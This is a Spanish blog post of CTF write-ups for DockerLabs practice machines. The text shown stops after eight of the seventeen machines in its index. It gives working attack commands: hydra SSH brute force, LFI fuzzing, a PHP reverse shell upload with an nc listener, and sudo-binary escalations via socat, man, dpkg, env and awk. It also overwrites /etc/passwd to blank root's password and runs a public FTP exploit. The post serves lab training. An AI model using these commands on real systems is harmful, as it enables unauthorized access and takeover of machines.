---
title: Writeups de la plataforma DockerLabs 🐋
description: Writeups de cada máquina de la plataforma DockerLabs. Se irá actualizando este artículo en función haga nuevas máquinas.
date: 2024-11-04
categories: [DockerLabs, CTF]
tags: [DockerLabs, CTF, Pentesting]
img_path: "/assets/img/dockerLabs.png"
image: "/assets/img/dockerLabs.png"
---


# Índice de máquinas resueltas 📝

## - [Stellarjwt](#stellarjwt)
## - [Amor](#amor)
## - [AnonymousPingu](#anonymouspingu)
## - [BorazuwarahCTF](#borazuwarahctf)
## - [BreakMySSH](#breakmyssh)
## - [BuscaLove](#buscalove)
## - [Escolares](#escolares)
## - [FirstHacking](#firsthacking)
## - [Hidden](#hidden)
## - [HiddenCat](#hiddencat)
## - [Inyection](#inyection)
## - [Move](#move)
## - [NodeClimb](#nodeclimb)
## - [SecretJenkins](#secretjenkins)
## - [Trust](#trust)
## - [Upload](#upload)
## - [Vacaciones](#vacaciones)

---

# [Stellarjwt](#índice-de-máquinas-resueltas-)

#### [🔗 **Link de la resolución en video**](https://www.youtube.com/watch?v=qnQ2cHklurU)

![1](/assets/img/writeups/stellarjwt/1.png)

#### [🔗 **Link de Descarga**](https://mega.nz/file/bFsR1SCD#ZrWjuyypHNSPS0VRDpyPKT8E8W4ZpKqnVGf27_VOu_k)

### ¿Qué trabajamos con esta máquina?

- Fuzzing
- JWT
- Explotación de binarios (socat, chown)
- Bypass de contraseña

### Fase de Reconocimiento

- Desplegamos la máquina con el script de auto_deploy de la siguiente manera:

`sudo bash auto_deploy.sh stellarjwt.tar`

![20](/assets/img/writeups/stellarjwt/20.png)


- Tiramos un ping y mediante el TTL vemos que se trata de una máquina Linux ya que es 64. No siempre es así.

`ping 172.17.0.2`

![21](/assets/img/writeups/stellarjwt/21.png)

- Hacemos un escaneo con la herramienta nmap de tipo SYN para que sea rápido y sigiloso y vemos que tiene los puertos 22,80 abiertos.

`sudo nmap -p- -sS --min-rate=5000 -n -Pn 172.17.0.2 -oN Puertos.txt`

-p- > Hace el escaneo a todo el rango de puertos (65535)

-sS > Escaneo de tipo SYN

--min-rate=5000 > Paquetes que no sean más lentos que 5000 paquetes por segundos (Da velocidad al escaneo).

-n > Desactiva la resolución DNS (Da velocidad al escaneo)

-Pn > Desactiva la resolución de hosts (Da velocidad al escaneo)

-oN Puertos.txt > Guarda el escaneo en formato Normal con el nombre Puertos.txt

![2](/assets/img/writeups/stellarjwt/2.png)

### Fase de Explotación

- Empezamos explotando el puerto 80. Entramos en la Web y vemos esta pregunta:

![3](/assets/img/writeups/stellarjwt/3.png)

- Buscamos en Internet y nos quedamos con el nombre Gottfried:

![4](/assets/img/writeups/stellarjwt/4.png)

- A continuación se me ocurre hacer fuzzing ya que no encuentro nada más.

`sudo gobuster dir -w /usr/share/wordlist/SecList/Discovery/Web-Content-directory-list-2.3-medium.txt -x .php,.py,.html,.txt -u "<http://172.17.0.2/>"`

dir > Para indicar que va a buscar directorios (rutas)
-w > Indicar el wordlist que va a utilizar para buscar las rutas
-x > También a buscar por extensiones por si hubiera algún archivo
-u > Para indicar la url donde hará fuzzing

/universe

![5](/assets/img/writeups/stellarjwt/5.png)

- Encontramos la siguiente ruta, por lo que entramos y vemos esta imagen.

![6](/assets/img/writeups/stellarjwt/6.png)

- A simple vista no vemos nada, podemos intentar hacer esteganografía, pero no va por ahí, entonces miramos el código fuente y si bajamos al final encontramos esta línea de código que a simple vista parece un JSON.

![7](/assets/img/writeups/stellarjwt/7.png)

- Buscamos en la Web [JWT](https://jwt.io/) y encontramos el primer usuario: **neptuno**.

![8](/assets/img/writeups/stellarjwt/8.png)

- Intentamos hacer fuerza bruta con hydra para el servicio SSH pero vemos que no funciona, así que me pongo a pensar y recuerdo la pregunta de antes. Por lo que intento probar la clave del usuario neptuno con el nombre de la persona que descubrió Neptuno: **Gottfried**

![9](/assets/img/writeups/stellarjwt/9.png)

### Escalada de Privilegios

- Listamos todos los archivos de la carpeta de trabajo y encontramos este fichero oculto:

![9](/assets/img/writeups/stellarjwt/9.png)

- Miramos y vemos que hay un posible usuario o contraseña: **Eisenhower**
- Comprobamos el /etc/passwd para ver los usuarios y vemos que hay un usuario que se llama **nasa**, tienen relación ya que EisenHower fundó la NASA. Por lo que es la clave del usuario nasa.

![10](/assets/img/writeups/stellarjwt/10.png)

- Vemos que podemos ejecutar como el usuario **elite** el binario *socat*. Conseguimos acceso al usuario elite.

![11](/assets/img/writeups/stellarjwt/11.png)

- Buscamos en [GTFOBins](https://gtfobins.github.io/) como explotar este binario.

`sudo -u elite /usr/bin/socat stdin exec:/bin/sh`

![22](/assets/img/writeups/stellarjwt/22.png)

- Hago una reverse shell y la sanitizo para que no me de problemas, ya que aunque hagas el `script /dev/null -c bash` no funciona del todo bien.
- Ponemos la IP nuestra (kali) y nos ponemos en escucha `nc -nlvp 443`

![12](/assets/img/writeups/stellarjwt/12.png)

- Nos ponemos en escucha y escribimos la revshell a mano ya que si copiamos y pegamos nos salen caracteres y al principio y al final, y no se pueden borrar.

- Conseguimos la shell y la sanitizamos. 

#### [🔗 Tutorial personal de cómo sanitizar TTY](https://github.com/Alv-fh/tty_treatment)

![13](/assets/img/writeups/stellarjwt/13.png)

#### Bypass de Contraseña

- Ahora hacemos un `sudo -l` y vemos que ponemos ejecutar como el usuario root el binario **chown**.

![26](/assets/img/writeups/stellarjwt/26.png)

- Bypass de Contraseña es una técnica de Escalada de Privilegios que consiste en intentar quitar la x de un usuario del /etc/passwd para poder acceder sin contraseña a él.

- Como vemos siempre sigue la misma sintaxis. En esta técnica vamos a fijarnos en los dos primeros campos separados por el delimitador (:)

1 -> Usuario

2 -> Referencia al /etc/shadow (Archivo donde se guardan las contraseñas, encriptadas y muy seguro)

- La idea de esta técnica es intentar quitar esa X para que el sistema no encuentre esa referencia (/etc/shadow) al intentar entrar como un usuario (root) , por lo que entiende que no tiene contraseña y podemos entrar sin ella.

#### Paso a Paso de la explotación

1 - Lo primero de todo es asignarnos propietarios del /etc/passwd. Como somos el usuario elite, pues seguimos esta sintaxis.

`sudo -u root /usr/bin/chown elite:elite /etc/passwd`

sudo -u root > Para ejecute el binario como si fuera root.
elite:elite /etc/passwd > Asigna el archivo /etc/passwd al usuario elite.

![14](/assets/img/writeups/stellarjwt/14.png)

2 - Nos copiamos el /etc/passwd pero vemos que no tenemos ningún editor de texto, así que lo copiamos en una nueva consola, en nuestro kali creamos un fichero.

![15](/assets/img/writeups/stellarjwt/15.png)

3 - Creamos un fichero y le quitamos la **x** de root como hemos hablado anteriormente.

4 - Ahora lo mostramos, lo copiamos y hacemos lo siguiente:

![16](/assets/img/writeups/stellarjwt/16.png)

`echo 'TODO_EL_ETC_PASSWD' > /etc/passwd`

![23](/assets/img/writeups/stellarjwt/23.png)

5 - Mostramos el /etc/passwd para comprobar que no tiene la x

![24](/assets/img/writeups/stellarjwt/24.png)

6 - Intentamos entrar como root y en teoría no nos pediría la contraseña:

![25](/assets/img/writeups/stellarjwt/25.png)

- En teoría ya estaría acabada la máquina pero esto es un plus para ver si accedemos de verdad a la NASA.
- Entramos y vemos este script, vamos a ejecutarlo haber lo que nos encontramos:
- Vemos que es un QUIZ, interesantee!!

![16](/assets/img/writeups/stellarjwt/17.png)

![16](/assets/img/writeups/stellarjwt/18.png)

- Y ahora vemos el resultado:

![16](/assets/img/writeups/stellarjwt/19.png)

Oleee!!!

Espero que os haya gustado :)

---

# [Amor](#índice-de-máquinas-resueltas-)

![1](/assets/img/writeups/amor/1.png)

#### [🔗 **Link de Descarga**](https://mega.nz/file/hG8ijIxA#ru335im55yCTn2_FgLHVNh_Y5QU2SES8apugbPJVkd0)

### ¿Qué trabajamos con esta máquina?

- Fuerza bruta
- Esteganografía
- Base 64
- Explotación del binario (ruby)

### Fase de Reconocimiento

- Hacemos ping a la IP que nos da al arrancar la máquina y vemos que tenemos conectividad con la máquina.

![2](/assets/img/writeups/amor/2.png)

- Utilizamos la herramienta nmap y vemos los puertos que tienen abiertos.

`sudo nmap -p- -sS -sC -sV -O 172.17.0.2 -oN puertos.txt`

![3](/assets/img/writeups/amor/3.png)

#### Puertos y Servicios abiertos

| Puerto | Servicio | Versión |
| --- | --- | --- |
| 22 | SSH | OpenSSH 9.6p1 |
| 80 | HTTP | Apache 2.4.58 |

### Fase de Explotación

- Vemos que en la página web hay un nombre **Carlota** que es el del Departamento de ciberseguridad.

![4](/assets/img/writeups/amor/4.png)

- Intentamos hacer ataque de fuerza bruta con **hydra**

`hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -I -t 64`

![5](/assets/img/writeups/amor/5.png)

- Entramos por SSH y le hacemos el tratamiento de TTY

![6](/assets/img/writeups/amor/6.png)

- Vemos que hay una imagen. Nos la traemos al Kali montando un servidor en python en la máquina objetivo.

`python3 -m http.server`

- Ahora en el Kali ejecutamos:

`wget <http://172.17.0.2:8000/imagen.jpg`>

![7](/assets/img/writeups/amor/7.png)

- Ahora la vemos con cualquier visor de imagen:

![8](/assets/img/writeups/amor/8.png)

- Aparentemente no hay nada.

- Veo que podemos ver el **/etc/passwd** y que hay otro usuario llamado **oscar**.

![9](/assets/img/writeups/amor/9.png)

- Vemos que hay una imagen. Nos la descargamos con un servidor de Python por ejemplo.

![10](/assets/img/writeups/amor/10.png)

- Ahora con la herramienta **steghide** vemos el contenido de dicha imagen y vemos que hay un **secret.txt** que parece un texto en **Base64**

![11](/assets/img/writeups/amor/11.png)

- Lo convertimos en **Base64** y probamos a entrar con *Oscar*.

![12](/assets/img/writeups/amor/12.png)

- Entramos y vemos que ponemos ejecutar el binario **ruby** como cualquier usuario.

![13](/assets/img/writeups/amor/13.png)

- Buscamos en nuestra herramienta **Searchbins**.

![14](/assets/img/writeups/amor/14.png)

- Y conseguimos root.

![15](/assets/img/writeups/amor/15.png)

---

# [AnonymousPingu](#índice-de-máquinas-resueltas-)

![1](/assets/img/writeups/anonymouspingu/1.png)

#### [🔗 **Link de Descarga**](https://mega.nz/file/dOMzjDjS#hByTSHdcOL9E3v8bI5Yd0SWEyYyrhwn5FvA2PUAY5pE)

### ¿Qué trabajamos con esta máquina?

- FTP Anonymous
- Reverse shell upload por FTP
- Explotación de los binarios (man, dpkg, chown)
- Bypass de contraseña

### Fase de Reconocimiento

- Hacemos ping a la IP que nos da y en función del TLL vemos que es una máquina Linux.

![2](/assets/img/writeups/anonymouspingu/2.png)

- Hacemos un escaneo de tipo de SYN para escanear de manera de sigilosa y rápida los puertos abiertos.

`sudo nmap -p- -sS --min-rate=5000 -n -Pn 172.17.0.2 -oN Puertos.txt`

-p- > Hace el escaneo a todo el rango de puertos (65535)

-sS > Escaneo de tipo SYN

--min-rate=5000 > Paquetes que no sean más lentos que 5000 paquetes por segundos (Da velocidad al escaneo).

-n > Desactiva la resolución DNS (Da velocidad al escaneo)

-Pn > Desactiva la resolución de hosts (Da velocidad al escaneo)

-oN Puertos.txt > Guarda el escaneo en formato Normal con el nombre Puertos.txt

![3](/assets/img/writeups/anonymouspingu/3.png)

| Puertos | Servicio |
| --- | --- |
| 21/TCP | FTP |
| 80/TCP | HTTP |

Hacemos un escaneo más preciso.

`sudo nmap -p22,80 -sS -sV -sC -O 172.17.0.2 -oN Target.txt`

-p22,80 > Hacer el escaneo solo a esos puertos en específico

-sS > Escaneo SYN

-sV > Para sacar la Versión de los servicios

-sC > Tira scripts básicos de reconocimiento que tiene nmap

-O > Para intentar sacar el Sistema Operativo

- Vemos que podemos acceder como el usuario Anonymous por FTP. También nos lista lo que parece ser la carpeta de un servidor Web. Y vemos que hay un directorio que tenemos permisos de escritura llamado /upload.

![4](/assets/img/writeups/anonymouspingu/4.png)


### Fase de Explotación

- Entramos y subimos una reverse shell en PHP, por ejemplo la de PentestMonkey. Pero antes la editamos.

- Ponemos en $ip nuestra IP del Kali Linux y el puerto que nos pondremos en escucha con nc.

![7](/assets/img/writeups/anonymouspingu/7.png)

- Ahora la subimos, teniendo en cuenta que FTP busca los archivos en el directorio actual de trabajo.

![5](/assets/img/writeups/anonymouspingu/5.png)

- Entramos en el Navegador y buscamos donde está subida la reverse shell. Teniendo en cuenta que esto es la raiz de la Página Web, poniendo un /upload lo encontraríamos. También se puede llegar dándole a acceder al Backend.

![8](/assets/img/writeups/anonymouspingu/8.png)


- Y vemos que está ahí subida la reverse shell.

![1](/assets/img/writeups/anonymouspingu/9.png)

- Nos ponemos en escucha con nc

`nc -nlvp 443`

- Y hacemos click en la php-reverse-shell.php. Si se queda cargando, es buena pinta, porque hemos conseguido la reverse shell.

### Escalada de Privilegios

- Hacemos un tratamiento de la TTY:

[Enlace github Alv-fh Tratamiento de la TTY](https://github.com/Alv-fh/tty_treatment)

![10](/assets/img/writeups/anonymouspingu/10.png)

- Hacemos un sudo -l y vemos que podemos ejecutar como el usuario pingu el binario man.

![11](/assets/img/writeups/anonymouspingu/11.png)

- Buscamos en GTFOBins como explotarlo y conseguimos acceder al usuario pingu. Nos dice que lo hagamos de esta manera:

`sudo -u pingu /usr/bin/man man`

![12](/assets/img/writeups/anonymouspingu/12.png)

- Conseguimos entrar y vemos que podemos ejecutar los binarios nmap y dpkg como el usuario gladys.

![13](/assets/img/writeups/anonymouspingu/13.png)

- Hacemos el mismo procedimiento y en mi caso voy a explotar el binario dpkg. Nos dice que hagamos esto:

`sudo -u gladys /usr/bin/dpkg -l`

![14](/assets/img/writeups/anonymouspingu/14.png)

- Conseguimos acceder como el usuario gladys y vemos que podemos ejecutar el binario chown como root.

![15](/assets/img/writeups/anonymouspingu/15.png)

#### Bypass de contraseña

- Entonces aquí podemos hacer un Bypass de Contraseña

- Entramos en el directorio /tmp ya que normalmente tenemos permisos de escritura.

- Nos copiamos todo el /etc/passwd y creamos un archivo pegando el /etc/passwd, pero en este caso quitamos la **x** de root. Ya que es el usuario que nos interesa acceder.

![16](/assets/img/writeups/anonymouspingu/16.png)

- En esta máquina no tenemos editores de texto, así que crearé el archivo en mi máquina Kali y luego mostraré el contenido y lo copiaré.

![17](/assets/img/writeups/anonymouspingu/17.png)

- Ahora en la máquina haremos lo siguiente para reemplazar este texto sin la x en el /etc/passwd.

- Ponemos todo el /etc/passwd entre comillas simples , es decir:

`echo 'TODO EL /ETC/PASSWD'`

- Y lo sobrescribimos al /etc/passwd original:

`echo 'TODO EL /ETC/PASSWD' > /etc/passwd`

```
root::0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
ftp:x:101:103:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
systemd-resolve:x:995:995:systemd Resolver:/:/usr/sbin/nologin
pingu:x:1001:1001::/home/pingu:/bin/bash
gladys:x:1002:1002::/home/gladys:/bin/bash
echo 'root::0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
ftp:x:101:103:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
systemd-resolve:x:995:995:systemd Resolver:/:/usr/sbin/nologin
pingu:x:1001:1001::/home/pingu:/bin/bash
gladys:x:1002:1002::/home/gladys:/bin/bash' > /etc/passwd

```

- Para comprobar que se ha hecho correctamente hacemos un cat al /etc/passwd y comprobamos que se le ha quitado la X correctamente.

![18](/assets/img/writeups/anonymouspingu/18.png)

- Ahora solo queda intentar acceder a root sin proporcionar clave.

`su root`

![19](/assets/img/writeups/anonymouspingu/19.png)

- Ya somos root!!

---

# [BorazuwarahCTF](#índice-de-máquinas-resueltas-)

![1](/assets/img/writeups/borazuwarahCTF/1.png)

#### [🔗 **Link de Descarga**](https://mega.nz/file/gWNQlaZD#CgYMb_EEBL0jcypTg0xZZUaIqhO47ueX6pPU6utLy1U)

### ¿Qué trabajamos con esta máquina?

- Esteganografía
- Fuerza bruta
- Explotación del binario bash

### Fase de Reconocimiento

- Hacemos un ping a la máquina que nos da y en función del TTL vemos que es una máquina Linux.

![2](/assets/img/writeups/borazuwarahCTF/2.png)

- Hacemos un escaneo de Puertos con nmap de tipo SYN.

`sudo nmap -p- -sS --min-rate=5000 -n -Pn 172.17.0.2 -oN Puertos.txt`

-p- > Puertos abiertos

-sS > Escaneo de tipo SYN, es un escaneo rápido y sigiloso

--min-rate=5000 > Muestre paquetes no más lentos que 5000 paquetes por segundo

-n > Desactive la resolución DNS

-Pn > Desactive la resolución de ARP (Host) porque sabemos que este host existe en la red

-oN > Formato normal de nmap.

![3](/assets/img/writeups/borazuwarahCTF/3.png)

| Puerto | Servicio |
| --- | --- |
| 22/TCP | SSH |
| 80/TCP | HTTP |

- Ahora vamos a comprobar la versión, Sistema Operativo y va a tirar unos scripts básicos de reconocimiento.

![4](/assets/img/writeups/borazuwarahCTF/4.png)

### Fase de Explotación

#### Esteganografía

- Entramos en el navegador y vemos esta imagen, miramos el código fuente pero no hay nada. Por lo que podemos intentar hacer Esteganografía.

![5](/assets/img/writeups/borazuwarahCTF/5.png)

- Nos la descargamos y podemos ver con la herramienta Steghide o con la herramienta Strings los metadatos de la imagen.

- Nos pide una clave para extraer los metadatos pero nos da un fichero llamado secreto.txt

`sudo steghide extract -sf imagen.jpeg`

![6](/assets/img/writeups/borazuwarahCTF/6.png)

- Y nos deja este texto.

![7](/assets/img/writeups/borazuwarahCTF/7.png)

- Entonces podemos usar la herramienta strings para ver todos los strings de la imagen.

`strings imagen.jpeg`

![8](/assets/img/writeups/borazuwarahCTF/8.png)

- Tenemos un usuario y si recordamos tenemos el puerto 22 abierto, por lo que podemos hacer un ataque de fuerza bruta.

`hydra -l borazuwarah -P /usr/share/wordlist/rockyou.txt ssh://172.17.0.2 -I -t64`

![9](/assets/img/writeups/borazuwarahCTF/9.png)

borazuwarah:123456

- Entramos por SSH y vemos que podemos ejecutar como cualquier usuario una bash.
Por lo que lo tenemos muy sencillo. Si ejecutamos una bash como privilegiado conseguiremos ser root.

`sudo -u root /bin/bash -p`

-p > Modo privilegiado.

![10](/assets/img/writeups/borazuwarahCTF/10.png)

- Y conseguimos ser root!!

---

# [BreakMySSH](#índice-de-máquinas-resueltas-)

![2](/assets/img/writeups/BreakMySSH/2.png)

#### [🔗 **Link de Descarga**](https://mega.nz/file/hfE3lbwZ#ExAcF54AyOHeJqgH2R4cDIAGc5IVlJnI5Rs-Us2QMpM)

### ¿Qué trabajamos con esta máquina?

- User Listing Versión SSH Desactualizada

### Fase de Reconocimiento

- Desplegamos la máquina y le hacemos ping  a la IP que nos da. Vemos que el TTL es 64 por lo que deducimos que es una máquina Linux.

![1](/assets/img/writeups/BreakMySSH/1.png)

- Hacemos un escaneo de Puertos con nmap de tipo SYN.

`sudo nmap -p- -sS --min-rate=5000 -n -Pn 172.17.0.2 -oN Puertos.txt`

-p- > Puertos abiertos

-sS > Escaneo de tipo SYN, es un escaneo rápido y sigiloso

--min-rate=5000 > Muestre paquetes no más lentos que 5000 paquetes por segundo

-n > Desactive la resolución DNS

-Pn > Desactive la resolución de ARP (Host) porque sabemos que este host existe en la red

-oN > Formato normal de nmap.

![4](/assets/img/writeups/BreakMySSH/4.png)

| Puerto | Servicio |
| --- | --- |
| 22 | SSH |

- Ahora hacemos un escaneo más profundo en el que averiguaremos la versión, SO, y tirará scripts de reconocimiento.

![5](/assets/img/writeups/BreakMySSH/5.png)

### Fase de explotación

- Buscamos la versión y vemos que es vulnerable a user listing. Pero primero hago un ataque de fuerza bruta con hydra y veo que es exitoso.

`hydra -l root -P /usr/share/wordlist/rockyou.txt ssh://172.17.0.2 -I -t64`

![6](/assets/img/writeups/BreakMySSH/6.png)

- Así que entramos como root!!

![7](/assets/img/writeups/BreakMySSH/7.png)

---

# [BuscaLove](#índice-de-máquinas-resueltas-)

![1](/assets/img/writeups/BuscaLove/1.png)

#### [🔗 **Link de Descarga**](https://mega.nz/file/RG8GlDaD#haVrr92MyD-PgDUwxIJURT0q-P9Sl3kaNNBc-Ggppmg)

### ¿Qué trabajamos con esta máquina?

- Fuzzing web
- LFI
- Fuerza Bruta (hydra)
- Cyberchef (Hexadecimal)
- Explotación del binario **env**

### Fase de Reconocimiento

- Ping a la IP que nos da y en función del TLL vemos que es una máquina Linux.

![2](/assets/img/writeups/BuscaLove/2.png)

- Hacemos un escaneo de tipo de SYN para escanear de manera de sigilosa y rápida los puertos abiertos.

`sudo nmap -p- -sS --min-rate=5000 -n -Pn 172.18.0.2 -oN Puertos.txt`

![3](/assets/img/writeups/BuscaLove/3.png)

| Puertos | Servicio |
| --- | --- |
| 22/TCP | SSH |
| 80/TCP | HTTP |

- Escaneo más preciso, a los puertos en específico.

`sudo nmap -p22,80 -sS -sV -sC -O 172.18.0.2 -oN Target.txt`

![4](/assets/img/writeups/BuscaLove/4.png)

### Fase de Explotación

- Entramos en la Web y encontramos la página por defecto de Apache2.

![8](/assets/img/writeups/BuscaLove/8.png)

#### Fuzzing Web

- Utilizamos la herramienta Gobuster para averiguar rutas. Vemos que hay una llamada **wordpress**.

![6](/assets/img/writeups/BuscaLove/6.png)

- Vemos esta interfaz en la que a simple vista no vemos nada. Así que volvemos a hacer fuzzing pero a /wordpress.

![5](/assets/img/writeups/BuscaLove/5.png)

- Y encontramos un **/index.php**

![6](/assets/img/writeups/BuscaLove/6.png)

#### LFI

- Entonces podemos hacer fuzzing para ver si encontramos algún string para poder realizar un LFI.

`wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 404 --hw 115 <http://172.18.0.2/wordpress/index.php?FUZZ=/etc/passwd`>

![9](/assets/img/writeups/BuscaLove/9.png)

- Y consegimos un LFI!

![10](/assets/img/writeups/BuscaLove/10.png)

- Si hacemos un `Ctrl + U` vemos el /etc/passwd de una manera más legible.

![11](/assets/img/writeups/BuscaLove/11.png)

- Vemos que hay dos usuarios.

pedro
rosa

- Si recordamos, el puerto 22 está abierto por lo que podemos hacer un ataque de fuerza bruta.
Lo intento con pedro, pero no hay resultado, así que probamos con rosa.

![12](/assets/img/writeups/BuscaLove/12.png)

- Vemos que podemos ejecutar como root el binario **ls** y el binario **cat**. Eso significa que podemos listar y ver todos los archivos del sistema.

![13](/assets/img/writeups/BuscaLove/13.png)

- Entonces buscamos en el de root y vemos un archivo llamado **secret.txt**

![14](/assets/img/writeups/BuscaLove/14.png)

- Lo leemos y vemos un texto en Hexadecimal.

![15](/assets/img/writeups/BuscaLove/15.png)

- Utilizamos [CyberChef](https://gchq.github.io/CyberChef/) para descifrar este texto. Le daremos a la barita mágica y encontramos este texto.

![16](/assets/img/writeups/BuscaLove/16.png)

- Probamos a entrar como el usuario **pedro** y esa clave.

![17](/assets/img/writeups/BuscaLove/17.png)

- Podemos ejecutar el binario **env** como root

![18](/assets/img/writeups/BuscaLove/18.png)

- Buscamos en GTFOBins como explotarlo.

![19](/assets/img/writeups/BuscaLove/19.png)

- Y conseguimos ser root!

![20](/assets/img/writeups/BuscaLove/20.png)

---

# [Escolares](#índice-de-máquinas-resueltas-)

![1](/assets/img/writeups/Escolares/1.png)

#### [🔗 **Link de Descarga**](https://mega.nz/file/ZXckGSob#QBn80M3tFNTrKCJwZ1lIh-9Rafx5sdlG3lyCT9FPYes)

### ¿Qué trabajamos con esta máquina?

- Fuzzing
- Wordpress
- Crear diccionario con cupp
- Fuerza bruta con wpscan
- Explotación Plugin File Manager
- Explotación del binario awk

### Fase de Reconocimiento

- Comprobamos que sí tenemos conectividad con la máquina y que el **TTL** es 64 por lo que hablamos de una máquina Linux.

![2](/assets/img/writeups/Escolares/2.png)

### Escaneo de Puertos

- Utilizamos la herramienta **nmap** y vemos los puertos abiertos.

![3](/assets/img/writeups/Escolares/3.png)

22 -> SSH

80 -> HTTP


![4](/assets/img/writeups/Escolares/4.png)

- También vemos que si le hacemos fuzzing a la ruta `http://ip/wordpress/` nos enumera esto:

![5](/assets/img/writeups/Escolares/5.png)

- Entramos en **trackback.php** y sale esto:

![6](/assets/img/writeups/Escolares/6.png)

- En el fuzzing web descubro que hay un dominio ya que veo la ruta absoluta y veo que **http://escolares.dl/**, por lo que lo añado al fichero **/etc/hosts**

![7](/assets/img/writeups/Escolares/7.png)

- Si busco **xmlrpc.php** sale lo siguiente:

![8](/assets/img/writeups/Escolares/8.png)

- Inspecciono la página y veo que hay un comentario en donde hace referencia a una ruta, por lo que decido ir.

![9](/assets/img/writeups/Escolares/9.png)

- Veo que luis es el admin, debajo en el correo pone luisillo por lo que puede que sea el usuario. Intento con **wpscan**.

![10](/assets/img/writeups/Escolares/10.png)

- Tendremos que crear con la herramienta [**cupp**](https://github.com/Mebus/cupp) un diccionario, y pondremos los datos que salen. Una vez generado, lo ponemos en el **wpscan**.

`wpscan --url <http://escolares.dl/wordpress> -U luisillo --passwords luis.txt`.

![11](/assets/img/writeups/Escolares/11.png)

- Encontramos la clave de luisillo. Y entramos

![12](/assets/img/writeups/Escolares/12.png)

- Veo que hay un plugin llamado File Manager, por lo que podemos investigar ahí, y vemos que podemos subir archivos.

![13](/assets/img/writeups/Escolares/13.png)

- Subimos una reverse shell en php -> [REVERSE-SHELL](https://github.com/pentestmonkey/php-reverse-shell)

- Antes de nada, la editamos y ponemos nuestra ip de atacante y el puerto que vayamos a utilizar.

![14](/assets/img/writeups/Escolares/14.png)

- Nos ponemos en escucha.

`nc -nlvp 443`

- Y buscamos la reverse shell en el navegador. Si se queda cargando, es buena señal.

![15](/assets/img/writeups/Escolares/15.png)

- Y conseguimos una shell. Hacemos el tratamiento de la **TTY** como aparece en pantalla.

![16](/assets/img/writeups/Escolares/16.png)

- Vemos el **/etc/passwd**.

![17](/assets/img/writeups/Escolares/17.png)

- Nos metemos en el home y encontramos un fichero llamado secret.txt en el parece ser la clave de luisillo.

![18](/assets/img/writeups/Escolares/18.png)

- Entramos como luisillo y vemos que podemos ejecutar como cualquier usuario el binario **awk**.

- Buscamos en la herramienta [searchbins](https://github.com/r1vs3c/searchbins).

![19](/assets/img/writeups/Escolares/19.png)

- Lo ejecutamos en la máquina pero de esta manera para que no haya ningún error.

![2](/assets/img/writeups/Escolares/20.png)

- Ya somos root!!

---

# [FirstHacking](#índice-de-máquinas-resueltas-)

![1](/assets/img/writeups/FirstHacking/1.png)

#### [🔗 **Link de Descarga**](https://mega.nz/file/oCd2VC5D#QfiRoFmZrZ-FjTuyRX9bLw7638fjluwp6jNth7JjXTw)

### ¿Qué trabajamos con esta máquina?

- FTP exploit

### Fase de Reconocimiento

- Utilizamos la herramienta **nmap** y vemos los puertos abiertos.

![3](/assets/img/writeups/FirstHacking/3.png)

21 -> FTP

### Fase de Explotación

#### Manera 1

- Intento entrar como anonymous pero veo que no puedo, por lo que me decanto por la versión. La busco en internet y veo que es vulnerable. Por lo que busco un exploit con **metasploit**.

![4](/assets/img/writeups/FirstHacking/4.png)

- Veo lo que me pide y lo completo.

![5](/assets/img/writeups/FirstHacking/5.png)

- Y ejecuto el exploit con `run`.

![6](/assets/img/writeups/FirstHacking/6.png)

- Ya somos root!!

#### Manera 2

- Buscamos el exploit con **searchsploit**

![7](/assets/img/writeups/FirstHacking/7.png)

- Nos lo traemos a la máquina.

`searchsploit -m 49757.py`

![8](/assets/img/writeups/FirstHacking/8.png)

- Para ejecutarlo debemos utilizar python2.7 ya que el 3.0 ha quitado una función que utiliza este script.

`python2.7 49757.py 172.17.0.2`

